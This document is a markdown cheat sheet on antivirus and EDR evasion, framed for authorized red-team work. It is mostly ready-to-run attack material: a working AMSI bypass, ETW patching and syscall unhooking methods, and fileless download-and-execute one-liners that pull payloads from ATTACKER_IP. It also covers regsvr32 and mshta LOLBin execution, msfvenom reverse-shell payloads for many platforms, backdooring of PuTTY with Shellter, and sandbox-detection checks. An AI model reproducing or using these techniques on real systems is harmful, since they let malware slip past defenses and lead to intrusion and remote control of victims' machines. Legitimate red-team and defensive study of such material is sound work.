# Antivirus & EDR Evasion Techniques

Comprehensive guide to AV/EDR bypass, AMSI/ETW bypass, obfuscation, shellcode loaders, sleep obfuscation, and evasion tooling for **authorized** penetration testing and red-team engagements. Test only in isolated labs with sample-submission disabled, and document techniques + telemetry for the report.

> **AV vs EDR — they are different problems.** Static AV (signatures/ML on the file) is beaten by obfuscation/encryption/loaders. **EDR** instruments the *runtime*: userland API hooks, AMSI, ETW, kernel callbacks (process/thread/image-load), and ETW-TI from the kernel. Beating AV ≠ beating EDR. Most of the "advanced" content below targets EDR. See also `shellcode-loaders.md` (companion file) for loader construction.

---

## Threat Model: What Modern Defenses Actually Do

| Layer | Mechanism | Beaten by |
|-------|-----------|-----------|
| Static AV | Hash/byte signatures, ML on PE features | Encryption, packing, custom loader, unique builds |
| AMSI | In-proc scan of scripts/.NET before exec | AMSI patch (memory or patchless/HWBP), avoid amsi'd hosts |
| ETW (userland) | Telemetry events (e.g. .NET, threat-intel) | ETW patch, indirect/`Nt*` calls, patchless HWBP |
| Userland hooks | EDR DLL hooks `ntdll`/`kernel32` | Direct/indirect syscalls, unhooking, hardware breakpoints |
| Kernel callbacks | Process/thread/image notify routines | Hard from userland; BYOVD (loud, risky), behavior shaping |
| Memory scanning | Periodic RWX/beacon scans | Sleep obfuscation (Ekko/Foliage), RW->RX flips, module stomping |
| Behavioral / ML | Process tree, API sequences, network | Sane parent procs, LOLBins, low volume, jittered C2 |

### AV Detection Methods (static layer)

| Method | Description | Bypass Difficulty |
|--------|-------------|-------------------|
| Signature-based | Hash/pattern matching | Easy |
| Heuristic-based | Rule/algorithm analysis | Medium |
| Behavioral | Runtime behavior analysis | Hard |
| Machine Learning | Cloud/local AI detection | Very Hard |

### AV Engine Components
- **File Engine**: Scheduled/real-time file scans
- **Memory Engine**: Process memory inspection
- **Network Engine**: Traffic analysis
- **Disassembler**: Machine code translation
- **Emulator/Sandbox**: Safe execution environment
- **Browser Plugin**: Web-based threat detection
- **ML Engine**: Unknown threat detection

---

## On-Disk Evasion

### Packers

```bash
# UPX - Ultimate Packer for eXecutables
upx --best malware.exe                    # Maximum compression
upx --brute malware.exe                   # Try all methods
upx -9 --ultra-brute malware.exe          # Extreme compression

# Custom UPX with modified signatures
upx --best malware.exe -o packed.exe
# Then modify UPX signature bytes with hex editor

# MPRESS Packer
mpress.exe -s malware.exe
```

### Crypters

```bash
# Hyperion (AES encryption)
wine hyperion.exe malware.exe encrypted.exe

# Custom XOR Crypter (Python)
python3 << 'EOF'
with open('payload.bin', 'rb') as f:
    shellcode = f.read()
key = 0xAA
encrypted = bytes([b ^ key for b in shellcode])
with open('encrypted.bin', 'wb') as f:
    f.write(encrypted)
EOF

# AES Encryption with OpenSSL
openssl enc -aes-256-cbc -in payload.exe -out encrypted.bin -k MySecretKey
```

### Obfuscators

```bash
# ConfuserEx (.NET)
ConfuserEx.CLI.exe -n payload.exe

# Obfuscator-LLVM (C/C++)
clang -mllvm -fla -mllvm -sub -mllvm -bcf source.c -o obfuscated
```

Code mutation techniques:
1. Semantic equivalent instructions (ADD vs SUB with negative)
2. Dead code insertion (never executed paths)
3. Function reordering (randomize function order)
4. Control flow flattening (flatten if/else to switch)

---

## In-Memory Evasion

### Process Injection (C#)

```csharp
// Key Windows API calls for classic injection:
// 1. OpenProcess - Get handle to target process
// 2. VirtualAllocEx - Allocate memory in target
// 3. WriteProcessMemory - Write shellcode to allocated memory
// 4. CreateRemoteThread - Execute shellcode in target process

// Flags: PROCESS_ALL_ACCESS (0x001F0FFF), MEM_COMMIT|MEM_RESERVE (0x3000), PAGE_EXECUTE_READWRITE (0x40)
```

### Process Hollowing

1. Create target process in suspended state (`CREATE_SUSPENDED`)
2. Get thread context and read PEB for image base
3. Unmap original image with `NtUnmapViewOfSection`
4. Allocate new memory and write payload
5. Update entry point and resume thread

### Reflective DLL Injection

```powershell
# Using Invoke-ReflectivePEInjection
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Invoke-ReflectivePEInjection.ps1')
Invoke-ReflectivePEInjection -PEPath C:\payload.dll -ProcId 1234

# Manual reflective loading
$PEBytes = [IO.File]::ReadAllBytes('C:\payload.dll')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ForceASLR
```

### APC Queue Injection

Inject into an alertable thread using `QueueUserAPC` - shellcode executes when the thread enters an alertable wait state.

---

## PowerShell In-Memory Execution

### Shellcode Execution Pattern

1. Use `VirtualAlloc` to allocate RWX memory
2. Copy shellcode bytes with `Marshal::Copy`
3. Create thread with `CreateThread` pointing to allocated memory
4. Wait with `WaitForSingleObject`

```bash
# Generate shellcode in PowerShell format
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f ps1
```

### AMSI Bypass Techniques

AMSI (Antimalware Scan Interface) lets AV scan script/.NET content *after* deobfuscation, in-process. To run in-memory payloads on modern Windows you typically neutralize it first. Note: the well-known static one-liners below are **signatured by AMSI itself** — you must obfuscate them (string-split, char-codes, env-var assembly) or use a patchless approach.

```powershell
# Method 1: amsiInitFailed flag (must be obfuscated; raw form is detected)
$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
$field.SetValue($null,$true)

# Method 2: Patch AmsiScanBuffer in memory (overwrite prologue to return clean)
#   - Resolve amsi.dll!AmsiScanBuffer, VirtualProtect RWX, write a stub that
#     returns AMSI_RESULT_CLEAN (or E_INVALIDARG). Classic but EDR watches the
#     write to amsi.dll. Build the bytes/offsets dynamically; don't hardcode.

# Method 3: Force a benign AMSI provider / break amsiContext (reflection on amsiSession)
```

**Patchless AMSI/ETW bypass via hardware breakpoints (current, OPSEC-safer 2025):**
Instead of patching `amsi.dll`/`ntdll` (which triggers memory-integrity and write-to-system-DLL detections), set a **debug-register hardware breakpoint** on `AmsiScanBuffer` (and `NtTraceControl` for ETW) via a vectored exception handler. When hit, the handler rewrites the return value/registers and resumes with `NtContinue`. No bytes in any module are modified, so signature/integrity checks see clean DLLs.

```text
Flow (implement in C / C# / Nim, not raw PowerShell):
1. AddVectoredExceptionHandler(1, &Handler)
2. Resolve AmsiScanBuffer (AMSI) and NtTraceControl (ETW) addresses
3. Set Dr0/Dr7 in the thread context (a hardware breakpoint, not a code patch)
   - use NtContinue to commit the modified context, NOT SetThreadContext,
     to avoid the ETW-TI NtSetThreadContext event
4. Handler fires on EXCEPTION_SINGLE_STEP at the target:
   - set RAX = AMSI_RESULT_CLEAN (or skip the call), advance RIP, resume
5. Bypass holds for the calling thread; few EDRs detect HWBP-based bypass today
```

Caveats: it's **per-thread** (set on each thread that runs scanned content), and **userland-only** — kernel-mode ETW-TI is unaffected. Public PoCs: rasta-mouse / various "PatchlessAMSI"/"PatchlessEtwAndAmsiBypass" repos.

### ETW Bypass (telemetry blinding)

ETW (esp. the .NET CLR provider and Microsoft-Windows-Threat-Intelligence) feeds EDR. Blind it before loading .NET assemblies in-memory:

```
- Patch ntdll!EtwEventWrite / NtTraceEvent to return immediately (classic patch).
- Patchless: HWBP on NtTraceControl (see above) — no module modification.
- Set the COMPlus_ETWEnabled=0 env var before spawning a .NET host (CLR-level).
- Use indirect syscalls so EDR's ntdll hooks (which also feed ETW) are skipped.
```

### Syscalls & Unhooking (defeat userland hooks)

EDRs hook `ntdll`/`kernel32` exports to inspect calls. Bypass the hooks:

```text
- Direct syscalls: invoke the syscall instruction yourself with the right SSN
  (syscall service number). Tooling: SysWhispers2/3, Hell's Gate, Halo's Gate,
  FreshyCalls. Problem: a syscall instruction NOT inside ntdll is itself an IOC
  to call-stack/instrumentation-callback detections.
- Indirect syscalls: load the SSN but jmp to the real `syscall;ret` gadget
  inside ntdll so the return address looks legitimate (used by Havoc's
  OBF_SYSCALL). Current best-balance technique.
- Unhooking: re-map a clean copy of ntdll (from disk/KnownDlls/suspended proc)
  over the hooked one to remove EDR hooks before you call.
```

### Execution Policy Bypasses

```powershell
# Command line bypass
powershell.exe -ExecutionPolicy Bypass -File script.ps1

# Encoded command
$command = Get-Content script.ps1 -Raw
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
powershell.exe -EncodedCommand $encoded

# Download and execute (fileless)
powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')"

# Registry modification
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser

# Pipe to PowerShell
Get-Content script.ps1 | powershell.exe -noprofile -
type script.ps1 | powershell.exe -noprofile -
```

---

## Shellter - PE Backdooring

### Installation

```bash
sudo apt update && sudo apt install shellter wine -y
```

### Auto Mode Usage

```bash
shellter
# PE Target: /path/to/putty.exe
# Enable Stealth Mode: Y
# Payload: L (Listed)
# Select: 1 (Meterpreter_Reverse_TCP)
# LHOST: ATTACKER_IP
# LPORT: 443
# Reflective Loader: Y
```

### Best Target Applications
- PuTTY.exe, WinSCP.exe, FileZilla.exe, 7zip.exe, Notepad++.exe, VLC.exe
- Criteria: Legitimate signed binary, common in enterprise, reasonable file size, stable PE structure

---

## Payload Generation (MSFVenom)

### Standard Reverse Shells

```bash
# Windows
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f exe -o shell.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f exe -o shell64.exe

# Meterpreter
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f exe -o met.exe
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=ATTACKER_IP LPORT=443 -f exe -o met_https.exe

# Stageless (better for evasion)
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f exe -o stageless.exe
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=ATTACKER_IP LPORT=443 -f exe -o met_stageless.exe
```

### Encoding and Obfuscation

```bash
# Single encoder with iterations
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f exe -e x86/shikata_ga_nai -i 10 -o encoded.exe

# Different encoders
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -e x86/fnstenv_mov -i 5 -f exe -o fnstenv.exe

# Chain encoders
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -e x86/shikata_ga_nai -i 3 | msfvenom -e x86/alpha_mixed -i 2 -f exe -o chained.exe
```

### Format-Specific Payloads

```bash
# PowerShell
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f psh -o payload.ps1
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f psh-reflection -o reflection.ps1

# C/C#/Python
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f c -o shellcode.c
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f csharp -o shellcode.cs
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f python -o shellcode.py

# Raw binary
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f raw -o shellcode.bin

# VBA Macro / HTA
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f vba -o macro.vba
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f hta-psh -o payload.hta

# Template injection (backdoor legitimate executable)
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f exe -x putty.exe -k -o backdoored_putty.exe

# Linux / macOS / Android / Java
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f elf -o shell.elf
msfvenom -p osx/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f macho -o shell.macho
msfvenom -p android/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=443 -o payload.apk
msfvenom -p java/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f jar -o payload.jar
```

### Listener Setup

```bash
# Netcat listener
nc -lvnp 443

# Meterpreter handler
msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST ATTACKER_IP;set LPORT 443;set ExitOnSession false;exploit -j"
```

---

## Advanced Evasion Techniques

### Variable Obfuscation (PowerShell)

```powershell
# String concatenation
$str = "Vir" + "tual" + "Alloc"

# Base64 encoding
$payload = "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')"
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
powershell.exe -EncodedCommand $encoded

# Format string obfuscation
$api = "{0}{1}{2}" -f 'Virtual','All','oc'

# Character substitution
$cmd = 'I'+'E'+'X'
& $cmd (New-Object Net.WebClient).DownloadString($url)
```

### Invoke-Obfuscation Framework

```powershell
git clone https://github.com/danielbohannon/Invoke-Obfuscation.git
Import-Module .\Invoke-Obfuscation.psd1
Invoke-Obfuscation

# SET SCRIPTPATH C:\payload.ps1
# TOKEN\ALL\1
# OUT C:\obfuscated.ps1
```

### Timing-Based Evasion (PowerShell)

```powershell
# Sleep to avoid sandbox (sandboxes have time limits)
Start-Sleep -Seconds 120

# Check process count (real systems have more)
if ((Get-Process | Measure-Object).Count -lt 50) { exit }

# Check system uptime
$uptime = (Get-Date) - (gcim Win32_OperatingSystem).LastBootUpTime
if ($uptime.TotalMinutes -lt 10) { exit }
```

### Sandbox Detection

```powershell
# Check for VM artifacts
(Get-WmiObject -Class Win32_ComputerSystem).Model -match "Virtual|VMware|VBox"
(Get-WmiObject -Class Win32_BIOS).SerialNumber -match "VMware|VirtualBox"
Test-Path "HKLM:\SOFTWARE\VMware, Inc.\VMware Tools"

# Check for debugging
[System.Diagnostics.Debugger]::IsAttached

# Check RAM (VMs often have less)
$ram = (Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB
if ($ram -lt 4) { exit }

# Check CPU cores
$cores = (Get-WmiObject -Class Win32_Processor).NumberOfCores
if ($cores -lt 2) { exit }
```

### LOLBins (Living Off the Land)

```bash
# Execute via regsvr32
regsvr32 /s /n /u /i:http://ATTACKER_IP/payload.sct scrobj.dll

# Execute via mshta
mshta.exe http://ATTACKER_IP/payload.hta

# Execute via rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("calc.exe")
```

---

## Quick Commands

```bash
# Standard reverse shell payload
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f exe > payload.exe

# PowerShell reflection payload
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f psh-reflection

# Encoded payload (3 iterations)
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f exe -e x86/shikata_ga_nai -i 3

# File hash for verification
sha256sum payload.exe

# Binary inspection
xxd -b file.txt
```

---

## Testing Tips

- Use isolated testing environments with sample submission disabled
- Stageless payloads are generally better for evasion than staged
- Custom-compiled payloads evade better than default msfvenom output
- Combine multiple techniques (encoding + packing + obfuscation) for best results
- Always profile the target AV solution before crafting payloads
